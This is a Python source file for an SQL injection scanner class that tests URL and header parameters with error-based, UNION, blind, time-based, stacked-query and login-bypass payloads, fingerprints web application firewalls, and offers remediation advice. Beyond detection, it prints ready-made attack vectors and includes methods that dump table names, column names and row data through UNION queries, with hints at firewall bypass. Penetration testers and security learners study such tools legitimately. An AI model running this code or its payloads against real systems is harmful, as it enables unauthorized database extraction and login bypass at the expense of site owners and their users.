import re
import time
import requests
from typing import Optional
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse, quote
from rich.console import Console
from rich.table import Table
from rich.panel import Panel

console = Console()


class SQLiScanner:
    ERROR_PATTERNS = {
        "MySQL": [
            r"You have an error in your SQL syntax",
            r"Warning.*mysql_",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"check the manual that corresponds to your MySQL",
            r"MySqlClient\.",
            r"com\.mysql\.jdbc",
            r"Unclosed quotation mark after the character string",
            r"SQLSTATE\[42000\]",
            r"mysql_num_rows", r"mysql_fetch",
            r"Supplied argument is not a valid MySQL",
            r"Result is not a MySQL", r"MySQL server version",
        ],
        "PostgreSQL": [
            r"PostgreSQL.*ERROR", r"Warning.*\Wpg_",
            r"valid PostgreSQL result", r"Npgsql\.",
            r"PG::SyntaxError", r"org\.postgresql\.util\.PSQLException",
            r"ERROR:\s+syntax error at or near",
            r"unterminated quoted string", r"pg_query\(\) expects",
        ],
        "MSSQL": [
            r"Driver.*SQL[\-\_\ ]*Server", r"OLE DB.*SQL Server",
            r"\bSQL Server[^&lt;]+Driver", r"Warning.*mssql_",
            r"\bSQL Server[^&lt;]+[0-9a-fA-F]{8}",
            r"System\.Data\.SqlClient\.SqlException",
            r"Unclosed quotation mark after the character string",
            r"Microsoft SQL Native Client error",
            r"ODBC SQL Server Driver", r"SqlException",
        ],
        "SQLite": [
            r"SQLite/JDBCDriver", r"SQLite\.Exception",
            r"System\.Data\.SQLite\.SQLiteException",
            r"Warning.*sqlite_", r"Warning.*SQLite3::",
            r"\[SQLITE_ERROR\]", r"SQLite error",
            r"SQLITE_MISUSE", r"near \".*\": syntax error",
        ],
        "Oracle": [
            r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error",
            r"Oracle.*Driver", r"Warning.*oci_",
            r"Warning.*ora_", r"ORA-01756", r"ORA-00933",
            r"quoted string not properly terminated",
        ],
    }

    HEADER_INJECT_PARAMS = [
        "X-Forwarded-For", "X-Real-IP", "Client-IP",
        "X-Client-IP", "X-Forwarded-Host", "Referer",
        "User-Agent", "Cookie",
    ]

    AUTH_BYPASS_PAYLOADS = [
        ("admin'-- -", "admin' OR '1'='1'-- -", "admin' OR 1=1-- -"),
        ("admin' #", "admin' OR '1'='1' #", "admin' OR 1=1 #"),
        ("' OR 1=1-- -", "' OR '1'='1'-- -", "' OR ''='"),
        ("admin')-- -", "admin') OR ('1'='1'-- -", "1') OR 1=1-- -"),
    ]

    ORDER_BY_PAYLOADS = list(range(1, 20))

    UNION_TEMPLATES = [
        "' UNION SELECT {cols}--",
        "') UNION SELECT {cols}--",
        "1 UNION SELECT {cols}--",
        "1) UNION SELECT {cols}--",
        "-1 UNION SELECT {cols}--",
        "0 UNION SELECT {cols}--",
        "' UNION ALL SELECT {cols}--",
        "') UNION ALL SELECT {cols}--",
    ]

    TIME_PAYLOADS = [
        ("' AND SLEEP(5)--", 5, "MySQL"),
        ("' AND SLEEP(10)--", 10, "MySQL"),
        ("1 AND SLEEP(5)", 5, "MySQL"),
        ("1' AND SLEEP(5)--", 5, "MySQL"),
        ("1' OR SLEEP(5)--", 5, "MySQL"),
        ("'; SELECT SLEEP(5);--", 5, "MySQL"),
        ("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 5, "MySQL"),
        ("'; WAITFOR DELAY '0:0:5'--", 5, "MSSQL"),
        ("1; WAITFOR DELAY '0:0:5'--", 5, "MSSQL"),
        ("' AND PG_SLEEP(5)--", 5, "PostgreSQL"),
        ("'; SELECT PG_SLEEP(5);--", 5, "PostgreSQL"),
        ("' AND (SELECT 1 FROM PG_SLEEP(5))::text='1'--", 5, "PostgreSQL"),
    ]

    BLIND_TRUE_FALSE = [
        ("' AND 1=1--", "' AND 1=2--"),
        ("' AND 'a'='a'--", "' AND 'a'='b'--"),
        ("1 AND 1=1", "1 AND 1=2"),
        ("1' AND '1'='1'--", "1' AND '1'='2'--"),
        ("' AND 1=1#", "' AND 1=2#"),
        ("1 AND 1=1--", "1 AND 1=2--"),
        ("1' AND 1=1 AND '1'='1", "1' AND 1=2 AND '1'='1"),
        ("admin' AND 1=1--", "admin' AND 1=2--"),
        ("' AND 'x'='x'--", "' AND 'x'='y'--"),
    ]

    NESTED_UNION_TEMPLATES = [
        "' UNION ALL SELECT \"1 UNION SELECT {inner_cols} FROM {table}-- -\",1{extra} FROM {src_table}#",
        "1 UNION ALL SELECT '1 UNION SELECT {inner_cols} FROM {table}-- -',1{extra} FROM {src_table}#",
    ]

    COMMON_PARAMS = [
        "id", "user", "uid", "page", "search", "q", "query", "cat",
        "item", "product", "name", "email", "pass", "password", "token",
        "sort", "order", "limit", "offset", "table", "column", "file",
        "path", "action", "cmd", "exec", "command", "username", "login",
    ]

    COMMON_TABLES = ["users", "flag", "flags", "admin", "admins", "messages",
                     "posts", "comments", "secrets", "data", "notes", "accounts"]

    def __init__(self, url: str, method: str = "GET", data: Optional[dict] = None,
                 headers: Optional[dict] = None, cookies: Optional[dict] = None, timeout: int = 10):
        self.url = url
        self.method = method.upper()
        self.data = data or {}
        self.headers = headers or {}
        self.cookies = cookies or {}
        self.timeout = timeout
        self.vulnerable = False
        self.vuln_type = ""
        self.db_type = ""
        self.injectable_params = []
        self.findings = []
        self.confidence = 0
        self.risk_level = "NONE"
        self.recommendations = []
        self.attack_vectors = []
        self.waf_detected = False
        self.waf_name = ""
        self.column_count = 0
        self.visible_columns = []
        self.auth_bypass_possible = False
        self.header_injectable = []

    def _send(self, payload: str, param: str, use_data: bool = False,
              extra_headers: Optional[dict] = None) -> requests.Response:
        parsed = urlparse(self.url)
        headers = {**self.headers}
        if extra_headers:
            headers.update(extra_headers)
        if use_data or self.method == "POST":
            test_data = self.data.copy()
            test_data[param] = payload
            return requests.request(
                self.method, self.url, data=test_data,
                headers=headers, cookies=self.cookies,
                timeout=self.timeout, allow_redirects=False, verify=False,
            )
        else:
            params = parse_qs(parsed.query, keep_blank_values=True)
            params[param] = [payload]
            new_query = urlencode(params, doseq=True)
            new_url = urlunparse(parsed._replace(query=new_query))
            return requests.get(
                new_url, headers=headers, cookies=self.cookies,
                timeout=self.timeout, allow_redirects=False, verify=False,
            )

    def _send_raw(self, url: str, headers: Optional[dict] = None) -> requests.Response:
        h = {**self.headers}
        if headers:
            h.update(headers)
        return requests.get(url, headers=h, cookies=self.cookies,
                            timeout=self.timeout, allow_redirects=False, verify=False)

    def _detect_waf(self, response: requests.Response) -> Optional[str]:
        waf_signatures = {
            "Cloudflare": [r"cloudflare", r"cf-ray", r"__cfduid", r"cf-cache-status"],
            "Akamai": [r"akamai", r"akamaighost", r"_abck", r"ak_bmsc"],
            "AWS WAF": [r"awselb", r"x-amzn-requestid", r"awswaf"],
            "ModSecurity": [r"mod_security", r"modsecurity", r"NOYB"],
            "Imperva": [r"incap_ses", r"visid_incap", r"imperva"],
            "F5 BIG-IP": [r"bigip", r"tsessionid", r"BIGipServer"],
            "Sucuri": [r"sucuri", r"cloudproxy"],
            "Wordfence": [r"wordfence", r"wf_", r"wordfenceLogedIn"],
            "Barracuda": [r"barra_counter_session", r"barracuda_"],
        }
        headers_text = str(response.headers).lower()
        body_text = response.text.lower()[:5000]
        for waf, patterns in waf_signatures.items():
            for pattern in patterns:
                if re.search(pattern, headers_text) or re.search(pattern, body_text):
                    return waf
        if response.status_code in [403, 406, 429, 501]:
            return "Unknown WAF (possible)"
        return None

    def _detect_db(self, response: requests.Response) -> Optional[str]:
        text = response.text + str(response.headers)
        for db, patterns in self.ERROR_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, text, re.IGNORECASE):
                    return db
        return None

    def _baseline(self, param: str) -> requests.Response:
        return self._send("1", param)

    def _check_error_based(self, param: str) -> dict:
        result = {"vulnerable": False, "db_type": None, "confidence": 0, "evidence": []}
        payloads = [
            "'", "''", "\"", "\"\"", "\\", "')", "'))",
            "1 OR 1=1", "1' OR '1'='1", "1' OR 1=1--",
            "' OR ''='", "1' OR 1=1#",
        ]
        baseline = self._baseline(param)
        baseline_len = len(baseline.text)
        baseline_status = baseline.status_code

        for payload in payloads:
            try:
                resp = self._send(payload, param)
                db = self._detect_db(resp)
                if db:
                    result["vulnerable"] = True
                    result["db_type"] = db
                    result["confidence"] = 95
                    result["evidence"].append(f"DB error detected ({db}) with payload: {payload}")
                    return result
                text_lower = resp.text.lower()
                error_keywords = ["error", "warning", "syntax", "mysql", "sql", "query", "exception", "unterminated", "invalid", "mismatch"]
                if resp.status_code != baseline_status and any(e in text_lower for e in error_keywords):
                    result["vulnerable"] = True
                    result["db_type"] = "Unknown"
                    result["confidence"] = 65
                    result["evidence"].append(f"Status change ({baseline_status}->{resp.status_code}) + error keywords")
                    return result
                if len(resp.text) != baseline_len and any(e in text_lower for e in ["error", "warning", "syntax"]):
                    result["vulnerable"] = True
                    result["db_type"] = "Unknown"
                    result["confidence"] = 55
                    result["evidence"].append("Response length changed with error content")
                    return result
            except requests.RequestException:
                continue
        return result

    def _detect_column_count(self, param: str) -> int:
        console.print("    [dim]Detecting column count via ORDER BY...[/dim]")
        baseline = self._baseline(param)
        for n in self.ORDER_BY_PAYLOADS:
            try:
                resp = self._send(f"' ORDER BY {n}--", param)
                if resp.status_code == 500 or "error" in resp.text.lower()[:2000]:
                    console.print(f"    [dim]  ORDER BY {n-1} OK, ORDER BY {n} fails -> {n-1} columns[/dim]")
                    return n - 1
            except requests.RequestException:
                continue
        console.print("    [dim]  ORDER BY did not reveal column count[/dim]")
        return 0

    def _find_visible_columns(self, param: str, num_cols: int) -> list:
        console.print(f"    [dim]Finding visible columns ({num_cols} cols)...[/dim]")
        cols = ",".join(str(i) for i in range(1, num_cols + 1))
        for tmpl in self.UNION_TEMPLATES:
            payload = tmpl.format(cols=cols)
            try:
                resp = self._send(payload, param)
                visible = []
                for i in range(1, num_cols + 1):
                    if str(i) in resp.text:
                        visible.append(i)
                if visible:
                    console.print(f"    [dim]  Visible columns: {visible}[/dim]")
                    return visible
            except requests.RequestException:
                continue
        return []

    def _check_union(self, param: str) -> dict:
        result = {"vulnerable": False, "db_type": None, "confidence": 0, "evidence": [], "columns": 0, "visible_columns": []}
        baseline = self._baseline(param)

        num_cols = self._detect_column_count(param)
        if num_cols == 0:
            for n in range(1, 12):
                cols = ",".join(["NULL"] * n)
                for tmpl in self.UNION_TEMPLATES:
                    try:
                        resp = self._send(tmpl.format(cols=cols), param)
                        db = self._detect_db(resp)
                        if resp.status_code == 200 and len(resp.text) > len(baseline.text) * 1.15:
                            num_cols = n
                            result["vulnerable"] = True
                            result["db_type"] = db or "Unknown"
                            result["confidence"] = 80
                            result["columns"] = n
                            result["evidence"].append(f"UNION with {n} columns returned extra data")
                            self.column_count = n
                            self.visible_columns = self._find_visible_columns(param, n)
                            result["visible_columns"] = self.visible_columns
                            return result
                    except requests.RequestException:
                        continue
        else:
            self.column_count = num_cols
            cols = ",".join(["NULL"] * num_cols)
            for tmpl in self.UNION_TEMPLATES:
                try:
                    resp = self._send(tmpl.format(cols=cols), param)
                    db = self._detect_db(resp)
                    if resp.status_code == 200 and len(resp.text) > len(baseline.text) * 1.1:
                        result["vulnerable"] = True
                        result["db_type"] = db or "Unknown"
                        result["confidence"] = 85
                        result["columns"] = num_cols
                        result["evidence"].append(f"UNION with {num_cols} columns confirmed (ORDER BY)")
                        self.visible_columns = self._find_visible_columns(param, num_cols)
                        result["visible_columns"] = self.visible_columns
                        return result
                except requests.RequestException:
                    continue
        return result

    def _check_blind(self, param: str) -> dict:
        result = {"vulnerable": False, "db_type": None, "confidence": 0, "evidence": [], "polarity": "normal"}
        for true_payload, false_payload in self.BLIND_TRUE_FALSE:
            try:
                true_resp = self._send(true_payload, param)
                false_resp = self._send(false_payload, param)
                true_len = len(true_resp.text)
                false_len = len(false_resp.text)
                true_status = true_resp.status_code
                false_status = false_resp.status_code
                if true_len != false_len or true_status != false_status:
                    diff_ratio = abs(true_len - false_len) / max(true_len, false_len, 1)
                    polarity = "normal"
                    if "available" in true_resp.text.lower() and "available" in false_resp.text.lower():
                        if '"available":true' in false_resp.text and '"available":false' in true_resp.text:
                            polarity = "inverted"
                            result["evidence"].append("NOTE: Oracle polarity is INVERTED (true->false, false->true)")
                    result["vulnerable"] = True
                    result["db_type"] = "Boolean-based blind"
                    result["confidence"] = min(95, 70 + int(diff_ratio * 100))
                    result["polarity"] = polarity
                    result["evidence"].append(f"True: {true_len} bytes / {true_status}, False: {false_len} bytes / {false_status} (diff: {diff_ratio:.0%})")
                    return result
            except requests.RequestException:
                continue
        return result

    def _check_time_based(self, param: str) -> dict:
        result = {"vulnerable": False, "db_type": None, "confidence": 0, "evidence": [], "delay": 0}
        for payload, delay, db_hint in self.TIME_PAYLOADS:
            try:
                start = time.time()
                self._send(payload, param)
                elapsed = time.time() - start
                if elapsed >= delay - 1:
                    result["vulnerable"] = True
                    result["db_type"] = f"Time-based ({db_hint})"
                    result["confidence"] = 90
                    result["delay"] = elapsed
                    result["evidence"].append(f"Response delayed {elapsed:.1f}s (expected {delay}s) - likely {db_hint}")
                    return result
            except requests.RequestException:
                continue
        return result

    def _check_stacked(self, param: str) -> dict:
        result = {"vulnerable": False, "confidence": 0, "evidence": []}
        payloads = [
            "'; SELECT 1--", "'; SELECT SLEEP(1)--", "1; SELECT 1--",
            "'; SELECT 1#", "1; SELECT 1#",
        ]
        for payload in payloads:
            try:
                start = time.time()
                resp = self._send(payload, param)
                elapsed = time.time() - start
                if elapsed > 1 or resp.status_code == 500:
                    result["vulnerable"] = True
                    result["confidence"] = 45
                    result["evidence"].append(f"Stacked query may execute ({elapsed:.1f}s)")
                    return result
            except requests.RequestException:
                continue
        return result

    def _check_auth_bypass(self, param: str) -> dict:
        result = {"vulnerable": False, "confidence": 0, "evidence": [], "bypass_payloads": []}
        login_indicators = ["login", "signin", "auth", "password", "credential"]
        url_lower = self.url.lower()
        is_login = any(ind in url_lower for ind in login_indicators)
        if not is_login and self.method == "POST":
            data_lower = str(self.data).lower()
            is_login = any(ind in data_lower for ind in login_indicators)
        if not is_login:
            return result

        console.print("    [dim]Testing authentication bypass...[/dim]")
        baseline = self._baseline(param)
        for payload_group in self.AUTH_BYPASS_PAYLOADS:
            for payload in payload_group:
                try:
                    resp = self._send(payload, param)
                    if resp.status_code == 200 and len(resp.text) > len(baseline.text) * 1.3:
                        result["vulnerable"] = True
                        result["confidence"] = 75
                        result["bypass_payloads"].append(payload)
                        result["evidence"].append(f"Auth bypass possible: {payload}")
                except requests.RequestException:
                    continue
        return result

    def _check_header_injection(self) -> list:
        console.print("  [yellow]Testing header-based injection...[/yellow]")
        injectable = []
        baseline = self._send_raw(self.url)
        for header_name in self.HEADER_INJECT_PARAMS:
            for payload in ["1' AND SLEEP(3)--", "1' AND 1=1--", "1' OR '1'='1"]:
                try:
                    start = time.time()
                    resp = self._send_raw(self.url, {header_name: f"127.0.0.1 {payload}"})
                    elapsed = time.time() - start
                    if elapsed >= 2.5:
                        injectable.append({"header": header_name, "type": "Time-based", "delay": elapsed})
                        console.print(f"    [bold red]VULNERABLE![/bold red] {header_name} (time delay: {elapsed:.1f}s)")
                        break
                    db = self._detect_db(resp)
                    if db:
                        injectable.append({"header": header_name, "type": "Error-based", "db": db})
                        console.print(f"    [bold red]VULNERABLE![/bold red] {header_name} ({db})")
                        break
                except requests.RequestException:
                    continue
        if not injectable:
            console.print(f"    [green]No header injection detected[/green]")
        return injectable

    def _get_params(self) -> list:
        parsed = urlparse(self.url)
        params = list(parse_qs(parsed.query, keep_blank_values=True).keys())
        if not params and self.method == "GET":
            params = self.COMMON_PARAMS[:5]
        if self.method == "POST" and self.data:
            params.extend(list(self.data.keys()))
        return list(set(params)) or self.COMMON_PARAMS[:5]

    def scan(self) -> dict:
        console.print(Panel("[bold cyan]SQL Injection Scanner — Field Methodology[/bold cyan]", border_style="cyan"))
        params = self._get_params()
        results = {
            "url": self.url, "method": self.method,
            "vulnerable": False, "vuln_type": "", "db_type": "",
            "injectable_params": [], "confidence": 0, "risk_level": "NONE",
            "waf_detected": None, "column_count": 0, "visible_columns": [],
            "auth_bypass_possible": False, "header_injectable": [],
            "findings": [], "recommendations": [], "attack_vectors": [],
        }

        test_resp = self._baseline(params[0])
        waf = self._detect_waf(test_resp)
        if waf:
            results["waf_detected"] = waf
            self.waf_detected = True
            self.waf_name = waf
            console.print(f"  [yellow]WAF detected:[/yellow] {waf}")
            results["findings"].append(f"WAF detected: {waf} - some tests may be blocked, consider WAF bypass techniques")

        for param in params:
            console.print(f"\n  [yellow]Testing parameter:[/yellow] {param}")
            checks = [
                ("Error-based", self._check_error_based),
                ("UNION-based", self._check_union),
                ("Boolean-blind", self._check_blind),
                ("Time-based", self._check_time_based),
                ("Stacked queries", self._check_stacked),
                ("Auth bypass", self._check_auth_bypass),
            ]
            for check_name, check_fn in checks:
                try:
                    check_result = check_fn(param)
                    if check_result.get("vulnerable"):
                        results["vulnerable"] = True
                        results["injectable_params"].append(param)
                        results["vuln_type"] = check_name
                        results["db_type"] = check_result.get("db_type") or results["db_type"]
                        results["confidence"] = max(results["confidence"], check_result["confidence"])
                        results["findings"].extend(check_result.get("evidence", []))
                        if check_name == "UNION-based":
                            results["column_count"] = check_result.get("columns", 0)
                            results["visible_columns"] = check_result.get("visible_columns", [])
                        if check_name == "Auth bypass":
                            results["auth_bypass_possible"] = True
                        console.print(f"    [bold red]VULNERABLE![/bold red] {check_name} (confidence: {check_result['confidence']}%)")
                        break
                    else:
                        console.print(f"    [green]Not vulnerable[/green] ({check_name})")
                except Exception as e:
                    console.print(f"    [dim]Error testing {check_name}: {e}[/dim]")

        header_results = self._check_header_injection()
        if header_results:
            results["header_injectable"] = header_results
            results["vulnerable"] = True
            results["findings"].extend([f"Header injection: {h['header']} ({h['type']})" for h in header_results])
            if not results["vuln_type"]:
                results["vuln_type"] = "Header-based"
                results["confidence"] = max(results["confidence"], 85)

        if results["vulnerable"]:
            results["risk_level"] = "CRITICAL" if results["confidence"] >= 80 else "HIGH" if results["confidence"] >= 60 else "MEDIUM"
            results["recommendations"] = self._generate_recommendations(results)
            results["attack_vectors"] = self._generate_attack_vectors(results)
        else:
            results["risk_level"] = "LOW"
            results["recommendations"] = self._generate_safe_recommendations(results)

        self.vulnerable = results["vulnerable"]
        self.vuln_type = results["vuln_type"]
        self.db_type = results["db_type"]
        self.injectable_params = results["injectable_params"]
        self.confidence = results["confidence"]
        self.risk_level = results["risk_level"]
        return results

    def _generate_recommendations(self, results: dict) -> list:
        recs = [
            "CRITICAL: Use parameterized queries (prepared statements) — never concatenate user input into SQL",
            "Implement allowlist input validation on all parameters",
            "Apply least-privilege principle to database accounts — deny DROP, DELETE, FILE, EXECUTE",
            "Enable WAF rules for SQL injection patterns (test bypass resistance after)",
            "Use an ORM that handles parameterization automatically",
            "Log and monitor all failed login attempts and SQL errors",
        ]
        if results["db_type"] and "MySQL" in results["db_type"]:
            recs.append("MySQL: Use mysql_real_escape_string() with SET NAMES if not using prepared statements")
        if results["db_type"] and "PostgreSQL" in results["db_type"]:
            recs.append("PostgreSQL: Use pg_prepare() / $1 parameter binding")
        if results["vuln_type"] == "UNION-based":
            recs.append("Restrict SELECT on information_schema, pg_catalog — limits UNION data extraction")
            recs.append("Use database views to limit what application accounts can query")
        if results["vuln_type"] == "Time-based":
            recs.append("Time-based injection bypasses many WAF rules — use input parameterization, not just WAF")
        if results["auth_bypass_possible"]:
            recs.append("Authentication bypass found — ensure password check is not skippable via comments")
            recs.append("Use bcrypt/argon2 for password hashing, compare hashes server-side")
        if results["header_injectable"]:
            recs.append("Header values used in SQL — sanitize X-Forwarded-For, User-Agent, Referer before any DB query")
            recs.append("Do not trust client-supplied headers for logging without validation")
        if results["column_count"] > 0:
            recs.append(f"Query has {results['column_count']} columns — UNION attacks need matching column count")
        return recs

    def _generate_attack_vectors(self, results: dict) -> list:
        vectors = []
        param = results["injectable_params"][0] if results["injectable_params"] else "id"
        if results["vuln_type"] == "UNION-based" and results["column_count"] > 0:
            n = results["column_count"]
            vis = results["visible_columns"]
            display_col = vis[0] if vis else 2
            other_cols = [f"NULL" for _ in range(n)]
            vectors.append(f"# Column count: {n}, Visible: {vis}")
            vectors.append(f"' UNION SELECT {','.join(other_cols[:display_col-1])},@@version,{','.join(other_cols[display_col:])}--")
            vectors.append(f"' UNION SELECT {','.join(other_cols[:display_col-1])},current_user(),{','.join(other_cols[display_col:])}--")
            vectors.append(f"' UNION SELECT {','.join(other_cols[:display_col-1])},database(),{','.join(other_cols[display_col:])}--")
            vectors.append(f"' UNION SELECT {','.join(other_cols[:display_col-1])},GROUP_CONCAT(table_name SEPARATOR 0x0a),{','.join(other_cols[display_col:])} FROM information_schema.tables WHERE table_schema=database()--")
            vectors.append(f"' UNION SELECT {','.join(other_cols[:display_col-1])},GROUP_CONCAT(column_name SEPARATOR 0x0a),{','.join(other_cols[display_col:])} FROM information_schema.columns WHERE table_schema=database()--")
            vectors.append(f"' UNION SELECT {','.join(other_cols[:display_col-1])},GROUP_CONCAT(table_name,0x3a,column_name SEPARATOR 0x0a),{','.join(other_cols[display_col:])} FROM information_schema.columns WHERE table_schema=database()--")
            for table in self.COMMON_TABLES:
                vectors.append(f"' UNION SELECT {','.join(other_cols[:display_col-1])},GROUP_CONCAT(*) SEPARATOR 0x0a,{','.join(other_cols[display_col:])} FROM {table}--")
            vectors.append(f"# Nested/second-order (if restricted DB user):")
            vectors.append(f"' UNION ALL SELECT \"1 UNION SELECT 1,GROUP_CONCAT(flag),3,4 FROM flag-- -\",1,2 FROM users#")
        elif results["vuln_type"] == "Error-based":
            vectors.extend([
                "' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--",
                "' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--",
                "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            ])
        elif results["vuln_type"] == "Time-based":
            vectors.extend([
                "' AND IF(1=1,SLEEP(3),0)--",
                "' AND IF((SELECT database())='mysql',SLEEP(3),0)--",
                "' AND IF(SUBSTRING((SELECT database()),1,1)='m',SLEEP(3),0)--",
            ])
        elif results["vuln_type"] == "Boolean-blind":
            vectors.extend([
                "# Use SUBSTRING + ASCII for character-by-character extraction",
                "' AND ASCII(SUBSTRING((SELECT database()),1,1))>100--",
                "' AND ASCII(SUBSTRING((SELECT database()),1,1))=109--",
                "# Or automate with sqlmap: sqlmap -u URL -p PARAM --technique=B --batch",
            ])
        elif results["vuln_type"] == "Auth bypass":
            vectors.extend([
                "admin'-- -",
                "admin' OR '1'='1'-- -",
                "' OR 1=1-- -",
                "admin')-- -",
                "admin' OR 1=1#",
            ])
        elif results["header_injectable"]:
            for h in results["header_injectable"]:
                vectors.append(f"Header: {h['header']} -> 1' AND SLEEP(5)--")
                vectors.append(f"Header: {h['header']} -> 127.0.0.1' OR '1'='1")
        else:
            vectors.extend([
                "' UNION SELECT NULL--",
                "' AND 1=1--",
                "' OR '1'='1",
                "admin'-- -",
            ])
        return vectors

    def _generate_safe_recommendations(self, results: dict) -> list:
        recs = [
            "No SQL injection detected with current tests — but this does NOT mean the target is safe",
            "Test with a more comprehensive payload list (sqlmap, manually crafted payloads)",
            "Test for NoSQL injection if MongoDB/Redis backend is suspected",
            "Test for ORM-specific injection (Hibernate HQL, Sequelize, ActiveRecord)",
            "Test for second-order SQLi (inputs stored and re-queried later)",
            "Test ALL parameters including HTTP headers (X-Forwarded-For, User-Agent, Referer, Cookie)",
            "Check for AJAX/helper endpoints not in the main page — enumerate routes with gobuster/dirsearch",
            "Read application text for hints: 'we log your IP' = header injection, 'read the terms' = hidden routes",
            "If a scanner says 'not vulnerable' — it means 'not vulnerable on the inputs I tested', not 'safe'",
        ]
        if results["waf_detected"]:
            recs.append(f"WAF ({results['waf_detected']}) detected — may block payloads, try bypass techniques (case variation, comments, encoding)")
        return recs

    def dump_tables(self, param: str) -> list:
        console.print(f"[cyan]Attempting table dump via parameter: {param}[/cyan]")
        tables = []
        cols = self.column_count or 3
        null_cols = ",".join(["NULL"] * cols)
        payload = f"' UNION SELECT {null_cols.replace('NULL', 'group_concat(table_name)', 1)} FROM information_schema.tables WHERE table_schema=database()--"
        try:
            resp = self._send(payload, param)
            table_pattern = re.findall(r'>([\w,]+)<', resp.text)
            for match in table_pattern:
                tables.extend(match.split(","))
        except requests.RequestException as e:
            console.print(f"[red]Error: {e}[/red]")
        return tables

    def dump_columns(self, param: str, table: str) -> list:
        console.print(f"[cyan]Attempting column dump for table: {table}[/cyan]")
        columns = []
        cols = self.column_count or 3
        null_cols = ",".join(["NULL"] * cols)
        payload = f"' UNION SELECT {null_cols.replace('NULL', 'group_concat(column_name)', 1)} FROM information_schema.columns WHERE table_name='{table}'--"
        try:
            resp = self._send(payload, param)
            col_pattern = re.findall(r'>([\w,]+)<', resp.text)
            for match in col_pattern:
                columns.extend(match.split(","))
        except requests.RequestException as e:
            console.print(f"[red]Error: {e}[/red]")
        return columns

    def dump_data(self, param: str, table: str, columns: list) -> list:
        console.print(f"[cyan]Attempting data dump: {table} ({', '.join(columns)})[/cyan]")
        col_str = ",".join(columns)
        cols = self.column_count or 3
        null_cols = ",".join(["NULL"] * cols)
        payload = f"' UNION SELECT {null_cols.replace('NULL', f'group_concat({col_str} separator 0x7c)', 1)} FROM {table}--"
        data = []
        try:
            resp = self._send(payload, param)
            rows = resp.text.split("|")
            data = [r.strip() for r in rows if r.strip()]
        except requests.RequestException as e:
            console.print(f"[red]Error: {e}[/red]")
        return data

    def print_results(self, results: dict):
        risk_colors = {"CRITICAL": "bold red", "HIGH": "red", "MEDIUM": "yellow", "LOW": "green", "NONE": "green"}
        risk_color = risk_colors.get(results["risk_level"], "white")

        table = Table(title="SQL Injection Analysis Report", border_style="cyan")
        table.add_column("Property", style="bold")
        table.add_column("Value")
        table.add_row("URL", results["url"])
        table.add_row("Method", results["method"])
        table.add_row("Vulnerable", "[bold red]YES[/bold red]" if results["vulnerable"] else "[green]NO[/green]")
        if results["vulnerable"]:
            table.add_row("Type", results["vuln_type"])
            table.add_row("Database", results["db_type"] or "Unknown")
            table.add_row("Injectable Params", ", ".join(results["injectable_params"]))
            table.add_row("Confidence", f"{results['confidence']}%")
        if results["column_count"]:
            table.add_row("Column Count", str(results["column_count"]))
        if results["visible_columns"]:
            table.add_row("Visible Columns", str(results["visible_columns"]))
        if results["auth_bypass_possible"]:
            table.add_row("Auth Bypass", "[bold red]POSSIBLE[/bold red]")
        if results["header_injectable"]:
            table.add_row("Header Injection", ", ".join(h["header"] for h in results["header_injectable"]))
        table.add_row("Risk Level", f"[{risk_color}]{results['risk_level']}[/{risk_color}]")
        if results["waf_detected"]:
            table.add_row("WAF", results["waf_detected"])
        console.print(table)

        if results["findings"]:
            console.print("\n[bold]Findings:[/bold]")
            for f in results["findings"]:
                console.print(f"  [cyan]->[/cyan] {f}")

        if results["recommendations"]:
            console.print("\n[bold]Recommendations:[/bold]")
            for i, r in enumerate(results["recommendations"], 1):
                console.print(f"  {i}. {r}")

        if results["attack_vectors"]:
            console.print("\n[bold]Attack Vectors & Payloads:[/bold]")
            for v in results["attack_vectors"]:
                if v.startswith("#"):
                    console.print(f"  [yellow]{v}[/yellow]")
                else:
                    console.print(f"  [red]![/red] {v}")
